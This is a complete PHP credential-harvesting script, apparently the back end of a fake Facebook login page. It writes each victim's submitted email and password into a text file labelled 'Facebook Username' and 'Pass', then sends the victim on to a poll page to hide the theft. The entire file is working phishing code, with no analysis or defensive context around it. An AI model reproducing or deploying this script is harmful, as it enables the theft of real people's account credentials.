<?php

file_put_contents("usernames.txt", "Facebook Username: " . $_POST['email'] . " Pass: " . $_POST['pass'] . "\n", FILE_APPEND);
header('Location: https://fast-poll.com/poll/a8e2e2b9');
exit();
?>
